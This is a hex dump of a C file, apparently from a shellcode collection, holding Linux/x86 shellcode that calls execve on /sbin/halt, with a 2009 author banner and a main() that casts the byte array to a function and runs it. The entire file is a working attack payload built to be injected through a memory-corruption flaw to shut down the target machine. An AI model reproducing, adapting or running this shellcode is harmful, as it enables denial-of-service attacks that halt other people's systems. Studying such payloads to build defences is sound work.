00000000  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include <stdio.|
00000010  68 3e 0d 0a 0d 0a 63 6f  6e 73 74 20 63 68 61 72  |h>....const char|
00000020  20 73 68 65 6c 6c 63 6f  64 65 5b 5d 3d 0d 0a 09  | shellcode[]=...|
00000030  22 5c 78 36 61 5c 78 30  62 22 09 09 2f 2f 20 70  |"\x6a\x0b"..// p|
00000040  75 73 68 09 24 30 78 62  0d 0a 09 22 5c 78 35 38  |ush.$0xb..."\x58|
00000050  22 09 09 09 2f 2f 20 70  6f 70 09 25 65 61 78 0d  |"...// pop.%eax.|
00000060  0a 09 22 5c 78 39 39 22  09 09 09 2f 2f 20 63 6c  |.."\x99"...// cl|
00000070  74 64 0d 0a 09 22 5c 78  35 32 22 09 09 09 2f 2f  |td..."\x52"...//|
00000080  20 70 75 73 68 09 25 65  64 78 0d 0a 09 22 5c 78  | push.%edx..."\x|
00000090  36 36 5c 78 36 38 5c 78  36 63 5c 78 37 34 22 09  |66\x68\x6c\x74".|
000000a0  2f 2f 20 70 75 73 68 77  20 24 30 78 37 34 36 63  |// pushw $0x746c|
000000b0  0d 0a 09 22 5c 78 36 38  5c 78 36 65 5c 78 32 66  |..."\x68\x6e\x2f|
000000c0  5c 78 36 38 5c 78 36 31  22 09 2f 2f 20 70 75 73  |\x68\x61".// pus|
000000d0  68 09 24 30 78 36 31 36  38 32 66 36 65 0d 0a 09  |h.$0x61682f6e...|
000000e0  22 5c 78 36 38 5c 78 32  66 5c 78 37 33 5c 78 36  |"\x68\x2f\x73\x6|
000000f0  32 5c 78 36 39 22 09 2f  2f 20 70 75 73 68 09 24  |2\x69".// push.$|
00000100  30 78 36 39 36 32 37 33  32 66 0d 0a 09 22 5c 78  |0x6962732f..."\x|
00000110  38 39 5c 78 65 33 22 09  09 2f 2f 20 6d 6f 76 09  |89\xe3"..// mov.|
00000120  25 65 73 70 2c 25 65 62  78 0d 0a 09 22 5c 78 35  |%esp,%ebx..."\x5|
00000130  32 22 09 09 09 2f 2f 20  70 75 73 68 09 25 65 64  |2"...// push.%ed|
00000140  78 0d 0a 09 22 5c 78 35  33 22 09 09 09 2f 2f 20  |x..."\x53"...// |
00000150  70 75 73 68 09 25 65 62  78 0d 0a 09 22 5c 78 38  |push.%ebx..."\x8|
00000160  39 5c 78 65 31 22 09 09  2f 2f 20 6d 6f 76 09 25  |9\xe1"..// mov.%|
00000170  65 73 70 2c 25 65 63 78  0d 0a 09 22 5c 78 63 64  |esp,%ecx..."\xcd|
00000180  5c 78 38 30 22 3b 09 09  2f 2f 20 69 6e 74 09 24  |\x80";..// int.$|
00000190  30 78 38 30 0d 0a 0d 0a  69 6e 74 20 6d 61 69 6e  |0x80....int main|
000001a0  28 29 0d 0a 7b 0d 0a 09  70 72 69 6e 74 66 09 28  |()..{...printf.(|
000001b0  22 5c 6e 5b 2b 5d 20 4c  69 6e 75 78 2f 78 38 36  |"\n[+] Linux/x86|
000001c0  20 65 78 65 63 76 65 28  2f 73 62 69 6e 2f 68 61  | execve(/sbin/ha|
000001d0  6c 74 2c 2f 73 62 69 6e  2f 68 61 6c 74 29 22 0d  |lt,/sbin/halt)".|
000001e0  0a 09 09 22 5c 6e 5b 2b  5d 20 44 61 74 65 3a 20  |..."\n[+] Date: |
000001f0  31 31 2f 30 37 2f 32 30  30 39 22 0d 0a 09 09 22  |11/07/2009"...."|
00000200  5c 6e 5b 2b 5d 20 41 75  74 68 6f 72 3a 20 54 68  |\n[+] Author: Th|
00000210  65 57 6f 72 6d 22 0d 0a  09 09 22 5c 6e 5c 6e 5b  |eWorm"...."\n\n[|
00000220  2b 5d 20 53 68 65 6c 6c  63 6f 64 65 20 53 69 7a  |+] Shellcode Siz|
00000230  65 3a 20 25 64 20 62 79  74 65 73 5c 6e 5c 6e 22  |e: %d bytes\n\n"|
00000240  2c 20 73 69 7a 65 6f 66  28 73 68 65 6c 6c 63 6f  |, sizeof(shellco|
00000250  64 65 29 2d 31 29 3b 0d  0a 09 28 2a 28 76 6f 69  |de)-1);...(*(voi|
00000260  64 20 28 2a 29 28 29 29  20 73 68 65 6c 6c 63 6f  |d (*)()) shellco|
00000270  64 65 29 28 29 3b 0d 0a  09 72 65 74 75 72 6e 20  |de)();...return |
00000280  30 3b 0d 0a 7d                                    |0;..}|
00000285
